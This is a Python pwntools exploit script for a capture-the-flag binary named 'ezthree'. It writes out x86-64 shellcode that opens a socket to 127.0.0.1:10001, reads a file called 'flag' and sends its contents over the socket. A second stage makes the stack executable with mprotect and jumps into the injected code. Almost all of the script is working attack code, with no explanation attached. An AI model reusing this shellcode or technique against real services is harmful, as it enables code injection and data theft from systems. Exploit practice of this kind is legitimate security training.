# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ezthree'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

# one_gad = one_gadget(libc.path)

def attack():
	# s = socket(2, 1, 6)
	# connect(s, &addr, 0x10)
	# open(/flag)
	# read(/flag)
	# write(socket)

	# p16(0x2), # AF_INET
	# p16(10001,endian="big"), # PORT
	# p32(0x7f000001, endian="big")
	
    shellcode=asm("""
		mov rax, 41
		mov rdi, 2
		mov rsi, 1
		mov rdx, 6
		syscall
		push 0
		mov rcx, 0x100007f11270002
		push rcx
		mov rsi, rsp
		xor rdi, rdi
		mov rax, 42
		mov rdx, 0x10
		syscall
		jmp $+0x32
	""")
	
    shellcode+="b"*0x30
	
    shellcode+=asm("""
		push 0x67616c66
		mov rax, 2
		xor rdx, rdx
		mov rdi, rsp
		xor rsi, rsi
		syscall
		
		xor rdi, rdi
		xchg rdi, rax
		mov rsi, rsp
		mov rdx, 0x50
		syscall
		
		xor rdi, rdi
		mov rax, 1
		syscall
		
	""")


    payload = shellcode


    sla('INput >> ' , payload)
	
    # dbg('*$rebase(0x0000000000001878)')
    sa('code > ' , 'aaaa\n')

    shell=asm("""
		mov rsp, fs:[0x300]
		push 0x8
		pop rsi
		push 7
		pop rdx
		push 0xA
		pop rax
		mov rdi, rsp
		and rdi, 0xFFFFFFFFFFFFF000
		syscall
		sub rsp,0x67
		jmp rsp
	""")
    payload = shell

    # dbg('*$rebase(0x0000000000001878)')
    sa('sometings ?' , payload)

    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ezthree.py
@Time    :   2022/07/02 16:33:34
@Author  :   Niyah 
'''